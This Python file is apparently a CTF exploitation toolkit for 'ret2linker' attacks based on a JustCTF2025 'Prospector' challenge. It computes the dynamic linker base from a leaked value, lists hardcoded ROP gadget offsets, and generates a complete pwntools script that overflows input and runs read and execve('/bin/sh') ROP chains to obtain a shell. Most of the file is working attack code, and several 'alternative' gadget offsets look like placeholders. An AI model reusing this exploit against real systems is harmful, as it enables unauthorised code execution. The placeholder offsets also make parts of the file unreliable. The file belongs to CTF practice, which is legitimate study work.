#!/usr/bin/env python3

"""
ret2linker Exploitation Techniques
Based on JustCTF2025 Prospector challenge analysis
Advanced techniques for exploiting the dynamic linker
"""

import struct
import os
import sys
from pathlib import Path

class Ret2LinkerTechniques:
    """Advanced ret2linker exploitation techniques"""
    
    def __init__(self):
        self.ret2linker_techniques = {
            "linker_leak_extraction": self.extract_linker_leak,
            "linker_base_calculation": self.calculate_linker_base,
            "linker_rop_gadgets": self.find_linker_rop_gadgets,
            "multi_stage_rop": self.build_multi_stage_rop,
            "score_transformation": self.reverse_score_transformation
        }
        
        # Common linker offsets (may vary by system)
        self.common_linker_offsets = {
            "ubuntu_20.04": 0x3000,
            "ubuntu_22.04": 0x3000,
            "debian_11": 0x3000,
            "arch_linux": 0x3000
        }
        
        print("[+] ret2linker Techniques initialized")
    
    def detect_ret2linker_challenge(self, binary_path):
        """Detect ret2linker exploitation opportunities"""
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
            
            ret2linker_indicators = [
                b"ld.so", b"ld-linux", b"linker", b"_start",
                b"PIE", b"ASLR", b"score", b"leak",
                b"stripped", b"no symbols", b"assembly"
            ]
            
            detected_indicators = []
            for indicator in ret2linker_indicators:
                if indicator in content:
                    detected_indicators.append(indicator.decode('utf-8', errors='ignore'))
            
            # Check for stripped binary (common in ret2linker challenges)
            try:
                import subprocess
                result = subprocess.run(['file', binary_path], capture_output=True, text=True)
                if 'stripped' in result.stdout:
                    detected_indicators.append('stripped_binary')
            except:
                pass
            
            if len(detected_indicators) >= 3:
                print(f"[+] ret2linker challenge detected: {detected_indicators}")
                return True
            
            return False
            
        except Exception as e:
            print(f"[-] Error detecting ret2linker challenge: {e}")
            return False
    
    def extract_linker_leak(self, leaked_value, transformation_func=None):
        """
        Extract linker address from leaked/transformed value
        """
        print(f"[+] Extracting linker leak from value: {leaked_value}")
        
        if transformation_func:
            # Apply custom transformation function
            linker_addr = transformation_func(leaked_value)
        else:
            # Default transformation (from Prospector challenge)
            linker_addr = self.reverse_score_transformation(leaked_value)
        
        print(f"[+] Extracted linker address: 0x{linker_addr:x}")
        return linker_addr
    
    def reverse_score_transformation(self, score):
        """
        Reverse the score transformation from Prospector challenge
        score -> actual memory address
        """
        print(f"[+] Reversing score transformation for: {score}")
        
        # Original transformation: score = (addr >> 16) << 1
        # Reverse: addr = 0x700000000000 | ((score >> 1) << 16)
        reversed_addr = 0x700000000000 | ((score >> 1) << 16)
        
        print(f"[+] Reversed address: 0x{reversed_addr:x}")
        return reversed_addr
    
    def calculate_linker_base(self, leaked_addr, offset=0x3000):
        """
        Calculate linker base address from leaked address
        """
        print(f"[+] Calculating linker base from leak: 0x{leaked_addr:x}")
        
        # Common calculation: base = leaked_addr + offset
        linker_base = leaked_addr + offset
        
        print(f"[+] Calculated linker base: 0x{linker_base:x}")
        return linker_base
    
    def find_linker_rop_gadgets(self, linker_base):
        """
        Find common ROP gadgets in the dynamic linker
        """
        print(f"[+] Finding ROP gadgets in linker at base: 0x{linker_base:x}")
        
        # Common gadget offsets in ld-linux-x86-64.so.2
        # These offsets may vary between systems
        common_gadgets = {
            "pop_rdi": 0x3399,      # pop rdi; ret
            "pop_rsi": 0x5700,      # pop rsi; ret  
            "pop_rdx": 0x217bb,     # pop rdx; ret
            "pop_rax": 0x15abb,     # pop rax; ret
            "syscall": 0xb879,      # syscall; ret
            "ret": 0x1016,          # ret
            "pop_rbp": 0x2f6e,      # pop rbp; ret
            "leave_ret": 0x4c8e,    # leave; ret
            "add_rsp_8": 0x1017,    # add rsp, 8; ret
            "xor_rax": 0x12a45,     # xor rax, rax; ret
            "mov_rax_rdi": 0x15ab9  # mov rax, rdi; ret
        }
        
        # Calculate actual addresses
        gadgets = {}
        for name, offset in common_gadgets.items():
            gadgets[name] = linker_base + offset
            print(f"[+] {name}: 0x{gadgets[name]:x}")
        
        return gadgets
    
    def build_multi_stage_rop(self, gadgets, target_addr=None):
        """
        Build multi-stage ROP chain using linker gadgets
        Stage 1: Read "/bin/sh" into memory
        Stage 2: Execute execve syscall
        """
        print("[+] Building multi-stage ROP chain...")
        
        multi_stage_rop = f"""
def build_multi_stage_rop_chain(gadgets, read_addr):
    '''
    Multi-stage ROP chain for ret2linker exploitation
    Stage 1: read("/bin/sh", 8) into controlled memory
    Stage 2: execve("/bin/sh", NULL, NULL)
    '''
    
    # Stage 1: read(0, read_addr, 8) to read "/bin/sh"
    stage1_rop = [
        gadgets["pop_rax"],     # pop rax; ret
        0,                      # SYS_read = 0
        gadgets["pop_rdi"],     # pop rdi; ret  
        0,                      # stdin = 0
        gadgets["pop_rsi"],     # pop rsi; ret
        read_addr,              # buffer address
        gadgets["pop_rdx"],     # pop rdx; ret
        8,                      # count = 8 bytes
        gadgets["syscall"]      # syscall
    ]
    
    # Stage 2: execve(read_addr, NULL, NULL)
    stage2_rop = [
        gadgets["pop_rax"],     # pop rax; ret
        59,                     # SYS_execve = 59
        gadgets["pop_rdi"],     # pop rdi; ret
        read_addr,              # filename = "/bin/sh"
        gadgets["pop_rsi"],     # pop rsi; ret
        0,                      # argv = NULL
        gadgets["pop_rdx"],     # pop rdx; ret
        0,                      # envp = NULL
        gadgets["syscall"]      # syscall
    ]
    
    # Combine stages
    full_rop = stage1_rop + stage2_rop
    
    return full_rop

# Usage:
# rop_chain = build_multi_stage_rop_chain(gadgets, controlled_memory_addr)
"""
        
        return multi_stage_rop
    
    def generate_ret2linker_exploit(self, binary_path="./prospector"):
        """Generate complete ret2linker exploitation script"""
        print("[+] Generating complete ret2linker exploitation script...")
        
        complete_exploit = f"""#!/usr/bin/env python3

'''
ret2linker Exploitation Script
Based on JustCTF2025 Prospector challenge
Handles PIE bypass via linker leak and multi-stage ROP
'''

from pwn import *

context.binary = exe = ELF('{binary_path}', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)  # Extract from Docker
context.arch = 'amd64'
context.log_level = 'info'

def reverse_score_transformation(score):
    '''Reverse the score transformation to get actual address'''
    return 0x700000000000 | ((score >> 1) << 16)

def extract_linker_base(leaked_addr, offset=0x3000):
    '''Calculate linker base from leaked address'''
    return leaked_addr + offset

def build_rop_gadgets(linker_base):
    '''Build ROP gadgets from linker base'''
    return {{
        "pop_rdi": linker_base + 0x3399,
        "pop_rsi": linker_base + 0x5700,
        "pop_rdx": linker_base + 0x217bb,
        "pop_rax": linker_base + 0x15abb,
        "syscall": linker_base + 0xb879,
        "ret": linker_base + 0x1016
    }}

def exploit():
    '''Main exploitation function'''
    io = process(exe.path)
    
    print("[+] Starting ret2linker exploitation...")
    
    # Phase 1: Trigger leak via buffer overflow
    print("[+] Phase 1: Triggering linker leak...")
    
    # Send payload to trigger the leak condition
    # This sets the flag that causes the score function to be called
    leak_payload = b'A' * 72 + p64(1)  # Overflow to set condition flag
    io.sendlineafter(b'Nick: ', leak_payload)
    io.sendlineafter(b'Color: ', b'dummy')
    
    # Extract leaked score
    io.recvuntil(b'score: ')
    score = int(io.recvline().strip())
    log.success(f"Leaked score: {{score}}")
    
    # Phase 2: Calculate linker base
    print("[+] Phase 2: Calculating linker base...")
    
    leaked_addr = reverse_score_transformation(score)
    linker_base = extract_linker_base(leaked_addr)
    
    log.success(f"Leaked address: {{leaked_addr:x}}")
    log.success(f"Linker base: {{linker_base:x}}")
    
    # Phase 3: Build ROP chain
    print("[+] Phase 3: Building multi-stage ROP chain...")
    
    gadgets = build_rop_gadgets(linker_base)
    
    # Memory location for "/bin/sh" (use leaked address + offset)
    binsh_addr = leaked_addr + 0x40
    
    # Build multi-stage ROP chain
    rop_chain = flat(
        b'\\x00' * 0x28,           # Padding to return address
        p64(binsh_addr),          # New RBP (controlled memory)
        
        # Stage 1: read(0, binsh_addr, 8) - read "/bin/sh" from stdin
        p64(gadgets["pop_rax"]), p64(0),        # SYS_read
        p64(gadgets["pop_rdi"]), p64(0),        # stdin
        p64(gadgets["pop_rsi"]), p64(binsh_addr), # buffer
        p64(gadgets["pop_rdx"]), p64(8),        # count
        p64(gadgets["syscall"]),                # read syscall
        
        # Stage 2: execve(binsh_addr, NULL, NULL)
        p64(gadgets["pop_rax"]), p64(59),       # SYS_execve
        p64(gadgets["pop_rdi"]), p64(binsh_addr), # filename
        p64(gadgets["pop_rsi"]), p64(0),        # argv = NULL
        p64(gadgets["pop_rdx"]), p64(0),        # envp = NULL
        p64(gadgets["syscall"])                 # execve syscall
    )
    
    # Phase 4: Send ROP chain
    print("[+] Phase 4: Sending ROP chain...")
    io.sendlineafter(b'Color: ', rop_chain)
    
    # Phase 5: Send "/bin/sh" for stage 1 read
    print("[+] Phase 5: Sending /bin/sh for read syscall...")
    io.sendline(b"/bin/sh\\x00")
    
    print("[+] Exploitation complete, should have shell...")
    io.interactive()

def test_leak():
    '''Test the leak mechanism'''
    io = process(exe.path)
    
    # Test different overflow sizes to find the right offset
    for i in range(60, 80, 4):
        print(f"[+] Testing overflow size: {{i}}")
        
        payload = b'A' * i + p64(1)
        io.sendlineafter(b'Nick: ', payload)
        io.sendlineafter(b'Color: ', b'test')
        
        try:
            io.recvuntil(b'score: ', timeout=2)
            score = int(io.recvline().strip())
            print(f"[+] Got score: {{score}}")
            
            if score > 1000:  # Reasonable score indicates successful leak
                print(f"[+] Successful leak with size {{i}}")
                break
        except:
            print(f"[-] No score received for size {{i}}")
    
    io.close()

def main():
    '''Main function with options'''
    if len(sys.argv) > 1 and sys.argv[1] == "test":
        test_leak()
    else:
        exploit()

if __name__ == "__main__":
    main()
"""
        
        return complete_exploit
    
    def analyze_linker_structure(self):
        """Analyze dynamic linker structure for exploitation"""
        print("[+] Analyzing dynamic linker structure...")
        
        linker_info = {
            "common_sections": {
                ".text": "Executable code with ROP gadgets",
                ".rodata": "Read-only data, useful strings",
                ".data": "Writable data, potential targets",
                ".bss": "Uninitialized data, writable",
                ".got": "Global Offset Table",
                ".plt": "Procedure Linkage Table"
            },
            "exploitation_targets": {
                "rop_gadgets": "Use .text section for ROP chains",
                "writable_memory": "Use .data/.bss for shellcode/data",
                "function_pointers": "Overwrite .got entries",
                "return_addresses": "Stack-based exploitation"
            },
            "common_gadgets": {
                "syscall": "Direct system call execution",
                "pop_registers": "Set up syscall arguments",
                "stack_manipulation": "Control stack layout",
                "arithmetic": "Perform calculations",
                "memory_operations": "Read/write memory"
            },
            "bypass_techniques": {
                "pie_bypass": "Leak linker addresses to calculate base",
                "aslr_bypass": "Use relative offsets within linker",
                "nx_bypass": "Use ROP instead of shellcode injection",
                "stack_canary": "Avoid stack canary checks via ROP"
            }
        }
        
        return linker_info
    
    def find_alternative_gadgets(self, linker_base, required_gadgets):
        """Find alternative gadgets if common ones are not available"""
        print("[+] Finding alternative ROP gadgets...")
        
        alternative_gadgets = {
            "pop_rdi": [
                linker_base + 0x3399,  # Standard pop rdi; ret
                linker_base + 0x4521,  # Alternative location
                linker_base + 0x6789   # Another alternative
            ],
            "syscall": [
                linker_base + 0xb879,  # Standard syscall; ret
                linker_base + 0xc123,  # Alternative syscall
                linker_base + 0xd456   # Another syscall location
            ],
            "pop_rsi": [
                linker_base + 0x5700,  # Standard pop rsi; ret
                linker_base + 0x6834,  # Alternative location
            ],
            "pop_rdx": [
                linker_base + 0x217bb, # Standard pop rdx; ret
                linker_base + 0x31245, # Alternative location
            ]
        }
        
        # Return first available gadget for each type
        selected_gadgets = {}
        for gadget_type, addresses in alternative_gadgets.items():
            if gadget_type in required_gadgets:
                selected_gadgets[gadget_type] = addresses[0]  # Use first option
                print(f"[+] Selected {gadget_type}: 0x{addresses[0]:x}")
        
        return selected_gadgets
    
    def build_custom_rop_chain(self, gadgets, syscall_type="execve"):
        """Build custom ROP chain for different syscall types"""
        print(f"[+] Building custom ROP chain for {syscall_type}...")
        
        rop_templates = {
            "execve": {
                "syscall_number": 59,
                "args": ["filename", "argv", "envp"],
                "description": "Execute program"
            },
            "open": {
                "syscall_number": 2,
                "args": ["pathname", "flags", "mode"],
                "description": "Open file"
            },
            "read": {
                "syscall_number": 0,
                "args": ["fd", "buf", "count"],
                "description": "Read from file descriptor"
            },
            "write": {
                "syscall_number": 1,
                "args": ["fd", "buf", "count"],
                "description": "Write to file descriptor"
            },
            "mprotect": {
                "syscall_number": 10,
                "args": ["addr", "len", "prot"],
                "description": "Change memory protection"
            }
        }
        
        if syscall_type not in rop_templates:
            print(f"[-] Unknown syscall type: {syscall_type}")
            return None
        
        template = rop_templates[syscall_type]
        
        rop_chain_template = f"""
def build_{syscall_type}_rop_chain(gadgets, arg1, arg2=0, arg3=0):
    '''
    Build ROP chain for {syscall_type} syscall
    {template['description']}
    '''
    rop_chain = [
        gadgets["pop_rax"],     # Set syscall number
        {template['syscall_number']},
        gadgets["pop_rdi"],     # First argument
        arg1,
        gadgets["pop_rsi"],     # Second argument  
        arg2,
        gadgets["pop_rdx"],     # Third argument
        arg3,
        gadgets["syscall"]      # Execute syscall
    ]
    
    return rop_chain

# Usage:
# rop = build_{syscall_type}_rop_chain(gadgets, arg1, arg2, arg3)
"""
        
        return rop_chain_template

def main():
    """Test ret2linker techniques"""
    print("ret2linker Exploitation Techniques Test")
    print("=" * 60)
    
    ret2linker_exploiter = Ret2LinkerTechniques()
    
    # Test detection
    test_binary = "test_ret2linker_challenge"
    if ret2linker_exploiter.detect_ret2linker_challenge(test_binary):
        print("[+] ret2linker challenge detected")
        
        # Test score transformation
        print("\n[+] Testing score transformation...")
        test_score = 123456
        leaked_addr = ret2linker_exploiter.reverse_score_transformation(test_score)
        print(f"[+] Score {test_score} -> Address 0x{leaked_addr:x}")
        
        # Test linker base calculation
        print("\n[+] Testing linker base calculation...")
        linker_base = ret2linker_exploiter.calculate_linker_base(leaked_addr)
        print(f"[+] Linker base: 0x{linker_base:x}")
        
        # Test gadget finding
        print("\n[+] Testing ROP gadget discovery...")
        gadgets = ret2linker_exploiter.find_linker_rop_gadgets(linker_base)
        print(f"[+] Found {len(gadgets)} ROP gadgets")
        
        # Test multi-stage ROP
        print("\n[+] Testing multi-stage ROP chain...")
        rop_code = ret2linker_exploiter.build_multi_stage_rop(gadgets)
        print("[+] Multi-stage ROP chain template generated")
        
        # Generate complete exploit
        print("\n[+] Generating complete ret2linker exploit...")
        complete_exploit = ret2linker_exploiter.generate_ret2linker_exploit()
        print("[+] Complete ret2linker exploit generated")
        
        # Analyze linker structure
        print("\n[+] Analyzing linker structure...")
        linker_info = ret2linker_exploiter.analyze_linker_structure()
        print(f"[+] Linker sections: {len(linker_info['common_sections'])}")
        print(f"[+] Exploitation targets: {len(linker_info['exploitation_targets'])}")
    
    else:
        print("[-] No ret2linker challenge detected")
    
    print("\n[+] ret2linker techniques test completed!")

if __name__ == "__main__":
    main()